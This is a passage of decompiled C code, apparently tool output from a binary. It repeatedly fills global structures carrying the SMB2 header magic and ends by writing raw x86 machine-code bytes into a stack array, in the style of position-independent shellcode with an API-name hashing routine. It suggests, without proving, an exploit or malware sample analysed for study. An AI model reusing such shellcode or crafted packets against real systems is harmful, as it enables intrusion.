    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  *(undefined *)puVar3 = *(undefined *)puVar2;
  iVar1 = 0x177;
  _DAT_00490b90 = 0xe0000000;
  _DAT_00490b94 = 0x3f15170a;
  _DAT_00490b98 = 0;
  _DAT_00490b9c = 1;
  _DAT_00490ba0 = 0x5de;
  puVar2 = &DAT_0042575c;
  puVar3 = &DAT_00490ba4;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  *(undefined2 *)puVar3 = *(undefined2 *)puVar2;
  iVar1 = 0x16d;
  _DAT_004932b8 = 0x50000000;
  _DAT_004932bc = 0x3f105d45;
  _DAT_004932c0 = 0;
  _DAT_004932c4 = 1;
  _DAT_004932c8 = 0x5b4;
  puVar2 = &DAT_00425d3c;
  puVar3 = &DAT_004932cc;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  _DAT_004959e0 = 0x18000000;
  _DAT_004959e4 = 0x3f31601c;
  _DAT_004959e8 = 0;
  _DAT_004959ec = 1;
  _DAT_004959f0 = 0x4d1;
  iVar1 = 0x134;
  puVar2 = &DAT_004262f0;
  puVar3 = &DAT_004959f4;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  *(undefined *)puVar3 = *(undefined *)puVar2;
  iVar1 = 0x177;
  _DAT_00498108 = 0xc0000000;
  _DAT_0049810c = 0x3f07bfed;
  _DAT_00498110 = 0;
  _DAT_00498114 = 1;
  _DAT_00498118 = 0x5de;
  puVar2 = &DAT_004267c4;
  puVar3 = &DAT_0049811c;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  *(undefined2 *)puVar3 = *(undefined2 *)puVar2;
  iVar1 = 0x16d;
  _DAT_0049a830 = 0xde600000;
  _DAT_0049a834 = 0x3f8e66cb;
  _DAT_0049a838 = 0;
  _DAT_0049a83c = 1;
  _DAT_0049a840 = 0x5b4;
  puVar2 = &DAT_00426da4;
  puVar3 = &DAT_0049a844;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  iVar1 = 0x134;
  _DAT_0049cf58 = 0x88000000;
  _DAT_0049cf5c = 0x3f45f817;
  _DAT_0049cf60 = 0;
  _DAT_0049cf64 = 1;
  _DAT_0049cf68 = 0x4d1;
  puVar2 = &DAT_00427358;
  puVar3 = &DAT_0049cf6c;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  *(undefined *)puVar3 = *(undefined *)puVar2;
  iVar1 = 0x177;
  _DAT_0049f680 = 0xc0000000;
  _DAT_0049f684 = 0x3f06f1a2;
  _DAT_0049f688 = 0;
  _DAT_0049f68c = 1;
  _DAT_0049f690 = 0x5de;
  puVar2 = &DAT_0042782c;
  puVar3 = &DAT_0049f694;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  *(undefined2 *)puVar3 = *(undefined2 *)puVar2;
  iVar1 = 0x16d;
  _DAT_004a1da8 = 0x60000000;
  _DAT_004a1dac = 0x3f0fcd83;
  _DAT_004a1db0 = 0;
  _DAT_004a1db4 = 1;
  _DAT_004a1db8 = 0x5b4;
  puVar2 = &DAT_00427e0c;
  puVar3 = &DAT_004a1dbc;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  iVar1 = 0x134;
  _DAT_004a44d0 = 0x22000000;
  _DAT_004a44d4 = 0x3f424cab;
  _DAT_004a44d8 = 0;
  _DAT_004a44dc = 1;
  _DAT_004a44e0 = 0x4d1;
  puVar2 = &DAT_004283c0;
  puVar3 = &DAT_004a44e4;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  *(undefined *)puVar3 = *(undefined *)puVar2;
  iVar1 = 0x177;
  _DAT_004a6bf8 = 0;
  _DAT_004a6bfc = 0x3f074903;
  _DAT_004a6c00 = 0;
  _DAT_004a6c04 = 1;
  _DAT_004a6c08 = 0x5de;
  puVar2 = &DAT_00428894;
  puVar3 = &DAT_004a6c0c;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  *(undefined2 *)puVar3 = *(undefined2 *)puVar2;
  iVar1 = 0x16d;
  _DAT_004a9320 = 0xc1000000;
  _DAT_004a9324 = 0x3f8e8bd6;
  _DAT_004a9328 = 0;
  _DAT_004a932c = 1;
  _DAT_004a9330 = 0x5b4;
  puVar2 = &DAT_00428e74;
  puVar3 = &DAT_004a9334;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  _DAT_004aba48 = 0x60000000;
  _DAT_004aba4c = 0x3f08eb5e;
  iVar1 = 0x134;
  _DAT_004aba50 = 0;
  _DAT_004aba54 = 1;
  _DAT_004aba58 = 0x4d1;
  puVar2 = &DAT_00429428;
  puVar3 = &DAT_004aba5c;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  *(undefined *)puVar3 = *(undefined *)puVar2;
  iVar1 = 0x177;
  _DAT_004ae170 = 0x10000000;
  _DAT_004ae174 = 0x3f14184c;
  _DAT_004ae178 = 0;
  _DAT_004ae17c = 1;
  _DAT_004ae180 = 0x5de;
  puVar2 = &DAT_004298fc;
  puVar3 = &DAT_004ae184;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  *(undefined2 *)puVar3 = *(undefined2 *)puVar2;
  iVar1 = 0x16d;
  _DAT_004b0898 = 0x60000000;
  _DAT_004b089c = 0x3f023dd6;
  _DAT_004b08a0 = 0;
  _DAT_004b08a4 = 1;
  _DAT_004b08a8 = 0x5b4;
  puVar2 = &DAT_00429edc;
  puVar3 = &DAT_004b08ac;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  iVar1 = 0x134;
  _DAT_004b2fc0 = 0x60000000;
  _DAT_004b2fc4 = 0x3f4a9e08;
  _DAT_004b2fc8 = 0;
  _DAT_004b2fcc = 1;
  _DAT_004b2fd0 = 0x4d1;
  puVar2 = &DAT_0042a490;
  puVar3 = &DAT_004b2fd4;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  *(undefined *)puVar3 = *(undefined *)puVar2;
  iVar1 = 0x17;
  _DAT_004b56e8 = 0xe0000000;
  _DAT_004b56ec = 0x3f11b578;
  _DAT_004b56f0 = 0;
  _DAT_004b56f4 = 1;
  _DAT_004b56f8 = 0x5f;
  puVar2 = &DAT_0042a964;
  puVar3 = &DAT_004b56fc;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  *(undefined2 *)puVar3 = *(undefined2 *)puVar2;
  *(undefined *)((int)puVar3 + 2) = *(undefined *)((int)puVar2 + 2);
  _DAT_004ba540 = 2;
  _DAT_004ba544 = 2;
  _DAT_004bcc6c = 2;
  iVar1 = 0x22;
  _DAT_004b7e10 = 0x17d90000;
  _DAT_004b7e14 = 0x3ffb00f8;
  _DAT_004b7e18 = 1;
  _DAT_004b7e1c = 1;
  _DAT_004ba538 = 0xb14a0000;
  _DAT_004ba53c = 0x3fce463e;
  _DAT_004bcc60 = 0xe9b00000;
  _DAT_004bcc64 = 0x3fa133cc;
  _DAT_004bcc68 = 0;
  _DAT_004bcc70 = 0x89;
  puVar2 = &DAT_0042a9c4;
  puVar3 = &DAT_004bcc74;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  *(undefined *)puVar3 = *(undefined *)puVar2;
  _DAT_004bf394 = 2;
  _DAT_004c1abc = 2;
  iVar1 = 0x10;
  _DAT_004bf388 = 0x38000000;
  _DAT_004bf38c = 0x3f200e51;
  _DAT_004bf390 = 1;
  _DAT_004c1ab0 = 0xf4000000;
  _DAT_004c1ab4 = 0x3f885d29;
  _DAT_004c1ab8 = 0;
  _DAT_004c1ac0 = 0x55;
  puVar2 = &DAT_0042aa50;
  puVar3 = &DAT_004c1ac4;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  *(undefined *)puVar3 = *(undefined *)puVar2;
  _DAT_004c690c = 3;
  _DAT_004cb75c = 3;
  _DAT_004c41d8 = 0xe5a00000;
  _DAT_004c41dc = 0x3f871f0f;
  _DAT_004c41e0 = 1;
  _DAT_004c41e4 = 2;
  _DAT_004c6900 = 0xbce00000;
  _DAT_004c6904 = 0x3f848af5;
  _DAT_004c6908 = 2;
  _DAT_004c9028 = 0x40600000;
  _DAT_004c902c = 0x3fa3f871;
  _DAT_004c9030 = 2;
  _DAT_004c9034 = 4;
  _DAT_004cb750 = 0xb3000000;
  _DAT_004cb754 = 0x3f86f077;
  _DAT_004cb758 = 0;
  _DAT_004cb760 = 0x84;
  _DAT_004cb764 = 0xf7ff0000;
  _DAT_004cb768 = 0x424d53fe;
  _DAT_004cde78 = 0xf0000000;
  _DAT_004cde7c = 0x3f2534bc;
  _DAT_004cde80 = 2;
  _DAT_004cde84 = 5;
  _DAT_004d05a0 = 0xef400000;
  _DAT_004d05a4 = 0x3f842ca8;
  _DAT_004d05a8 = 0;
  _DAT_004d05ac = 4;
  _DAT_004d05b0 = 0x84;
  _DAT_004d05b4 = 0xf7ff0000;
  _DAT_004d05b8 = 0x424d53fe;
  _DAT_004d2cc8 = 0x80000000;
  _DAT_004d2ccc = 0x3f057d2e;
  _DAT_004d2cd0 = 0;
  _DAT_004d2cd4 = 5;
  _DAT_004d2cd8 = 0x84;
  _DAT_004d2cdc = 0xf7ff0000;
  _DAT_004d2ce0 = 0x424d53fe;
  _DAT_004d53f0 = 0xe0000000;
  _DAT_004d53f4 = 0x3f0c2a71;
  _DAT_004d53f8 = 2;
  _DAT_004d53fc = 6;
  _DAT_004d7b18 = 0xb4100000;
  _DAT_004d7b1c = 0x3f9040fe;
  _DAT_004d7b20 = 0;
  _DAT_004d7b24 = 6;
  _DAT_004d7b28 = 0x84;
  _DAT_004d7b2c = 0xf7ff0000;
  _DAT_004d7b30 = 0x424d53fe;
  _DAT_004da240 = 0xf0000000;
  _DAT_004da244 = 0x3f1178ab;
  _DAT_004da248 = 2;
  _DAT_004da24c = 7;
  _DAT_004dc968 = 0x97d00000;
  _DAT_004dc96c = 0x3f952b9b;
  _DAT_004dc970 = 2;
  _DAT_004dc974 = 8;
  _DAT_004df090 = 0xacc00000;
  _DAT_004df094 = 0x3f875036;
  _DAT_004df098 = 0;
  _DAT_004df09c = 7;
  _DAT_004df0a0 = 0x84;
  _DAT_004df0a4 = 0xf7ff0000;
  _DAT_004df0a8 = 0x424d53fe;
  _DAT_004e17b8 = 0xd0000000;
  _DAT_004e17bc = 0x3f1eb758;
  _DAT_004e17c0 = 0;
  _DAT_004e17c4 = 8;
  _DAT_004e17c8 = 0x84;
  _DAT_004e3ee8 = 2;
  _DAT_004e6610 = 2;
  _DAT_004edb88 = 2;
  _DAT_004f02b0 = 2;
  _DAT_004f5100 = 2;
  _DAT_004f9f50 = 2;
  _DAT_004feda0 = 2;
  _DAT_00503bf0 = 2;
  _DAT_004e17cc = 0xf7ff0000;
  _DAT_004e17d0 = 0x424d53fe;
  _DAT_004e3ee0 = 0x88000000;
  _DAT_004e3ee4 = 0x3f22834b;
  _DAT_004e3eec = 9;
  _DAT_004e6608 = 0xd1100000;
  _DAT_004e660c = 0x3f90e531;
  _DAT_004e6614 = 10;
  _DAT_004e8d30 = 0xc4c00000;
  _DAT_004e8d34 = 0x3f8628e2;
  _DAT_004e8d38 = 0;
  _DAT_004e8d3c = 9;
  _DAT_004e8d40 = 0x84;
  _DAT_004e8d44 = 0xf7ff0000;
  _DAT_004e8d48 = 0x424d53fe;
  _DAT_004eb458 = 0xe0000000;
  _DAT_004eb45c = 0x3f1f1e5b;
  _DAT_004eb460 = 0;
  _DAT_004eb464 = 10;
  _DAT_004eb468 = 0x84;
  _DAT_004eb46c = 0xf7ff0000;
  _DAT_004eb470 = 0x424d53fe;
  _DAT_004edb80 = 0;
  _DAT_004edb84 = 0x3f2343cc;
  _DAT_004edb8c = 0xb;
  _DAT_004f02a8 = 0x31000000;
  _DAT_004f02ac = 0x3f90f9c5;
  _DAT_004f02b4 = 0xc;
  _DAT_004f29d0 = 0x21a00000;
  _DAT_004f29d4 = 0x3f91b41e;
  _DAT_004f29d8 = 0;
  _DAT_004f29dc = 0xb;
  _DAT_004f29e0 = 0x84;
  _DAT_004f29e4 = 0xf7ff0000;
  _DAT_004f29e8 = 0x424d53fe;
  _DAT_004f50f8 = 0x68000000;
  _DAT_004f50fc = 0x3f20ec61;
  _DAT_004f5104 = 0xd;
  _DAT_004f7820 = 0x61e00000;
  _DAT_004f7824 = 0x3f893ce9;
  _DAT_004f7828 = 0;
  _DAT_004f782c = 0xc;
  _DAT_004f7830 = 0x84;
  _DAT_004f7834 = 0xf7ff0000;
  _DAT_004f7838 = 0x424d53fe;
  _DAT_004f9f48 = 0x30000000;
  _DAT_004f9f4c = 0x3f225872;
  _DAT_004f9f54 = 0xe;
  _DAT_004fc670 = 0x32000000;
  _DAT_004fc674 = 0x3f8fa06f;
  _DAT_004fc678 = 0;
  _DAT_004fc67c = 0xd;
  _DAT_004fc680 = 0x84;
  _DAT_004fc684 = 0xf7ff0000;
  _DAT_004fc688 = 0x424d53fe;
  _DAT_004fed98 = 0x38000000;
  _DAT_004fed9c = 0x3f22e3a1;
  _DAT_004feda4 = 0xf;
  _DAT_005014c0 = 0x2e200000;
  _DAT_005014c4 = 0x3f8464a6;
  _DAT_005014c8 = 0;
  _DAT_005014cc = 0xe;
  _DAT_005014d0 = 0x84;
  _DAT_005014d4 = 0xf7ff0000;
  _DAT_005014d8 = 0x424d53fe;
  _DAT_00503be8 = 0x98000000;
  _DAT_00503bec = 0x3f21e90b;
  _DAT_00503bf4 = 0x10;
  _DAT_00506310 = 0xfcd00000;
  _DAT_00506314 = 0x3f940e6a;
  _DAT_00506318 = 0;
  _DAT_0050631c = 0xf;
  _DAT_00506324 = 0xf7ff0000;
  _DAT_00506328 = 0x424d53fe;
  _DAT_00508a44 = 0x10;
  iVar1 = 0x22;
  _DAT_00506320 = 0x84;
  _DAT_00508a38 = 0x70000000;
  _DAT_00508a3c = 0x3f2005a0;
  _DAT_00508a40 = 0;
  _DAT_00508a48 = 0x89;
  puVar2 = &DAT_0042aa94;
  puVar3 = &DAT_00508a4c;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  *(undefined *)puVar3 = *(undefined *)puVar2;
  _DAT_0050b16c = 0x10;
  _DAT_0050d894 = 0x10;
  iVar1 = 0x15;
  _DAT_0050b160 = 0x68000000;
  _DAT_0050b164 = 0x3f24e127;
  _DAT_0050b168 = 1;
  _DAT_0050d888 = 0x20000000;
  _DAT_0050d88c = 0x3f842d86;
  _DAT_0050d890 = 0;
  _DAT_0050d898 = 0x55;
  puVar2 = &DAT_0042ab20;
  puVar3 = &DAT_0050d89c;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  *(undefined *)puVar3 = *(undefined *)puVar2;
  _DAT_00514e0c = 0x11;
  _DAT_00517534 = 0x11;
  _DAT_005126e4 = 2;
  _DAT_00514e08 = 2;
  _DAT_00519c58 = 2;
  _DAT_0051c380 = 2;
  _DAT_005211d0 = 2;
  _DAT_00526020 = 2;
  _DAT_0050ffb0 = 0xd8000000;
  _DAT_0050ffb4 = 0x3f84c53c;
  _DAT_0050ffb8 = 1;
  _DAT_0050ffbc = 0x10;
  _DAT_005126d8 = 0xd5a00000;
  _DAT_005126dc = 0x3f847db2;
  _DAT_005126e0 = 3;
  _DAT_00514e00 = 0xd0000000;
  _DAT_00514e04 = 0x3f8e6130;
  _DAT_00517528 = 0x7a00000;
  _DAT_0051752c = 0x3f979388;
  _DAT_00517530 = 0;
  _DAT_00517538 = 0x84;
  _DAT_0051753c = 0xf7ff0000;
  _DAT_00517540 = 0x424d53fe;
  _DAT_00519c50 = 0xc0000000;
  _DAT_00519c54 = 0x3f0f69a7;
  _DAT_00519c5c = 0x12;
  _DAT_0051c378 = 0x6c100000;
  _DAT_0051c37c = 0x3f936fb8;
  _DAT_0051c384 = 0x13;
  _DAT_0051eaa0 = 0xf8e00000;
  _DAT_0051eaa4 = 0x3f86e82b;
  _DAT_0051eaa8 = 0;
  _DAT_0051eaac = 0x12;
  _DAT_0051eab0 = 0x84;
  _DAT_0051eab4 = 0xf7ff0000;
  _DAT_0051eab8 = 0x424d53fe;
  _DAT_005211c8 = 0x20000000;
  _DAT_005211cc = 0x3f0a7d7c;
  _DAT_005211d4 = 0x14;
  _DAT_005238f0 = 0x6f900000;
  _DAT_005238f4 = 0x3f90710d;
  _DAT_005238f8 = 0;
  _DAT_005238fc = 0x13;
  _DAT_00523900 = 0x84;
  _DAT_00523904 = 0xf7ff0000;
  _DAT_00523908 = 0x424d53fe;
  _DAT_00526018 = 0xc0000000;
  _DAT_0052601c = 0x3f10f488;
  _DAT_00526024 = 0x15;
  _DAT_00528754 = 0xf7ff0000;
  _DAT_00528758 = 0x424d53fe;
  _DAT_0052ae74 = 0x15;
  _DAT_0052ae7c = 0xf7ff0000;
  _DAT_0052ae80 = 0x424d53fe;
  iVar1 = 0x17;
  _DAT_00528740 = 0xd6a00000;
  _DAT_00528744 = 0x3f88091c;
  _DAT_00528748 = 0;
  _DAT_0052874c = 0x14;
  _DAT_00528750 = 0x84;
  _DAT_0052ae68 = 0x40000000;
  _DAT_0052ae6c = 0x3f152262;
  _DAT_0052ae70 = 0;
  _DAT_0052ae78 = 0x84;
  _DAT_0052d590 = 0xa8000000;
  _DAT_0052d594 = 0x3f21498f;
  _DAT_0052d598 = 3;
  _DAT_0052d59c = 0x10;
  _DAT_0052fcb8 = 0x9b230000;
  _DAT_0052fcbc = 0x3fef7d50;
  _DAT_0052fcc0 = 0;
  _DAT_0052fcc4 = 1;
  _DAT_0052fcc8 = 0x5f;
  puVar2 = &DAT_0042ab78;
  puVar3 = &DAT_0052fccc;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  *(undefined2 *)puVar3 = *(undefined2 *)puVar2;
  *(undefined *)((int)puVar3 + 2) = *(undefined *)((int)puVar2 + 2);
  iVar1 = 0x177;
  _DAT_005323e0 = 0x80000000;
  _DAT_005323e4 = 0x3f235c0e;
  _DAT_005323e8 = 1;
  _DAT_005323ec = 1;
  _DAT_00534b08 = 0xdc200000;
  _DAT_00534b0c = 0x3f87c770;
  _DAT_00534b10 = 0;
  _DAT_00534b14 = 1;
  _DAT_00534b18 = 0x5de;
  puVar2 = &DAT_0042abd8;
  puVar3 = &DAT_00534b1c;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  *(undefined2 *)puVar3 = *(undefined2 *)puVar2;
  iVar1 = 0x16d;
  _DAT_00537230 = 0xae400000;
  _DAT_00537234 = 0x3f8aa2ad;
  _DAT_00537238 = 0;
  _DAT_0053723c = 1;
  _DAT_00537240 = 0x5b4;
  puVar2 = &DAT_0042b1b8;
  puVar3 = &DAT_00537244;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  iVar1 = 0x134;
  _DAT_00539958 = 0x10000000;
  _DAT_0053995c = 0x3f3b3cc3;
  _DAT_00539960 = 0;
  _DAT_00539964 = 1;
  _DAT_00539968 = 0x4d1;
  puVar2 = &DAT_0042b76c;
  puVar3 = &DAT_0053996c;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  *(undefined *)puVar3 = *(undefined *)puVar2;
  iVar1 = 0x16d;
  _DAT_0053c080 = 0x70000000;
  _DAT_0053c084 = 0x3f18212b;
  _DAT_0053c088 = 1;
  _DAT_0053c08c = 1;
  _DAT_0053e7a8 = 0xc5c00000;
  _DAT_0053e7ac = 0x3f95423d;
  _DAT_0053e7b0 = 0;
  _DAT_0053e7b4 = 3;
  _DAT_0053e7b8 = 0x5b4;
  puVar2 = &DAT_0042bc40;
  puVar3 = &DAT_0053e7bc;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  _DAT_00540ed0 = 0x56000000;
  _DAT_00540ed4 = 0x3f868688;
  _DAT_00540ed8 = 0;
  _DAT_00540edc = 3;
  _DAT_00540ee0 = 0x5b4;
  iVar1 = 0x16d;
  puVar2 = &DAT_0042c1f4;
  puVar3 = &DAT_00540ee4;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  iVar1 = 0x16d;
  _DAT_005435f8 = 0x60000000;
  _DAT_005435fc = 0x3f14b3fd;
  _DAT_00543600 = 0;
  _DAT_00543604 = 4;
  _DAT_00543608 = 0x5b4;
  puVar2 = &DAT_0042bc40;
  puVar3 = &DAT_0054360c;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  iVar1 = 0x16d;
  _DAT_00545d20 = 0xd6000000;
  _DAT_00545d24 = 0x3f77aeb9;
  _DAT_00545d28 = 0;
  _DAT_00545d2c = 4;
  _DAT_00545d30 = 0x5b4;
  puVar2 = &DAT_0042c1f4;
  puVar3 = &DAT_00545d34;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  iVar1 = 0x177;
  _DAT_00548448 = 0xc0000000;
  _DAT_0054844c = 0x3f18800f;
  _DAT_00548450 = 0;
  _DAT_00548454 = 5;
  _DAT_00548458 = 0x5dc;
  puVar2 = &DAT_0042c7a8;
  puVar3 = &DAT_0054845c;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  iVar1 = 0x163;
  _DAT_0054ab70 = 0xa0000000;
  _DAT_0054ab74 = 0x3f0a73f4;
  _DAT_0054ab78 = 0;
  _DAT_0054ab7c = 5;
  _DAT_0054ab80 = 0x58c;
  puVar2 = &DAT_0042cd84;
  puVar3 = &DAT_0054ab84;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  iVar1 = 0x177;
  _DAT_0054d298 = 0x40000000;
  _DAT_0054d29c = 0x3f090b0b;
  _DAT_0054d2a0 = 0;
  _DAT_0054d2a4 = 6;
  _DAT_0054d2a8 = 0x5dc;
  puVar2 = &DAT_0042c7a8;
  puVar3 = &DAT_0054d2ac;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  iVar1 = 0x163;
  _DAT_0054f9c0 = 0x59800000;
  _DAT_0054f9c4 = 0x3f6b9cbb;
  _DAT_0054f9c8 = 0;
  _DAT_0054f9cc = 6;
  _DAT_0054f9d0 = 0x58c;
  puVar2 = &DAT_0042d310;
  puVar3 = &DAT_0054f9d4;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  iVar1 = 0x16d;
  _DAT_005520e8 = 0x18000000;
  _DAT_005520ec = 0x3f2a8f00;
  _DAT_005520f0 = 0;
  _DAT_005520f4 = 7;
  _DAT_005520f8 = 0x5b4;
  puVar2 = &DAT_0042bc40;
  puVar3 = &DAT_005520fc;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  iVar1 = 0x16d;
  _DAT_00554810 = 0x80000000;
  _DAT_00554814 = 0x3f151213;
  _DAT_00554818 = 0;
  _DAT_0055481c = 7;
  _DAT_00554820 = 0x5b4;
  puVar2 = &DAT_0042c1f4;
  puVar3 = &DAT_00554824;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  _DAT_00556f38 = 0x94000000;
  _DAT_00556f3c = 0x3f392055;
  _DAT_00556f40 = 0;
  _DAT_00556f44 = 8;
  _DAT_00556f48 = 0x5dc;
  iVar1 = 0x177;
  local_594._0_1_ = 0xc1;
  puVar2 = &DAT_0042c7a8;
  puVar3 = &DAT_00556f4c;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  _DAT_00559660 = 0xa8000000;
  _DAT_00559664 = 0x3f24b1ac;
  _DAT_00559668 = 0;
  _DAT_0055966c = 8;
  local_594._1_1_ = 0xe7;
  local_594._2_1_ = 7;
  local_594._3_1_ = 0x29;
  local_590 = 199;
  local_58f = 0x89;
  local_58e = 0xf8;
  local_58d = 0x31;
  local_58c = 0xc9;
  local_58b = 0x8a;
  local_58a = 0xe;
  local_589 = 0x80;
  local_588 = 0xf9;
  local_587 = 0;
  local_586 = 0x74;
  local_585 = 5;
  local_584 = 1;
  local_583 = 200;
  local_582 = 0x46;
  local_581 = 0xeb;
  local_580 = 0xe9;
  local_57f = 0x5f;
  local_57e = 0x59;
  local_57d = 0x5e;
  local_57c = 0xc3;
  local_57b = 0x56;
  local_57a = 0x57;
  local_579 = 0x52;
  local_578 = 0x89;
  local_577 = 0xc6;
  local_576 = 0x31;
  local_575 = 0xc0;
  local_574 = 0x89;
  local_573 = 199;
  local_572 = 0xc1;
  local_571 = 0xe7;
  local_570 = 7;
  local_56f = 0x29;
  local_56e = 199;
  local_56d = 0x89;
  local_56c = 0xf8;
  local_56b = 0x31;
  local_56a = 0xd2;
  local_569 = 0x8a;
  local_568 = 0x16;
  local_567 = 1;
  local_566 = 0xd0;
  local_565 = 0x46;
  local_564 = 0xe2;
  local_563 = 0xee;
  local_562 = 0x5a;
  local_561 = 0x5f;
  local_560 = 0x5e;
  local_55f = 0xc3;
  local_55e = 0x56;
  local_55d = 0x51;
  local_55c = 0x57;
  local_55b = 0x89;
  local_55a = 0xc6;
  local_559 = 0x31;
  local_558 = 0xc0;
  local_557 = 0x89;
  local_556 = 199;
  local_555 = 0xc1;
  local_554 = 0xe7;
  local_553 = 7;
  local_552 = 0x29;
  local_551 = 199;
  local_550 = 0x89;
  local_54f = 0xf8;
  local_54e = 0x31;
  local_54d = 0xc9;
  local_54c = 0x8a;
  local_54b = 0xe;
  local_54a = 0x80;
  local_549 = 0xf9;
  local_548 = 0;
  local_547 = 0x74;
  local_546 = 0xc6;
  local_545 = 1;
  local_544 = 200;
  local_543 = 0x46;
  local_542 = 0x46;
  local_541 = 0xeb;
  local_540 = 0xe8;
  local_53f = 0x5f;
  local_53e = 0x59;
  local_53d = 0x5e;
  local_53c = 0xc3;
  local_53b = 0x83;
  local_53a = 0xc0;
  local_539 = 0x18;
  local_538 = 0x8b;
  local_537 = 0;
  local_536 = 0xc3;
  local_535 = 0x57;
  local_534 = 0x56;
  local_533 = 0x51;
  local_532 = 0x31;
  local_531 = 0xff;
  local_530 = 0x89;
  local_52f = 0xc6;
  local_52e = 0x39;
  local_52d = 0xdf;
  local_52c = 0x74;
  local_52b = 0x19;
  local_52a = 0x8b;
  local_529 = 4;
  local_528 = 0xba;
  local_527 = 1;
  local_526 = 0xf0;
  local_525 = 0xe8;
  local_524 = 0x83;
  local_523 = 0xff;
  local_522 = 0xff;
  local_521 = 0xff;
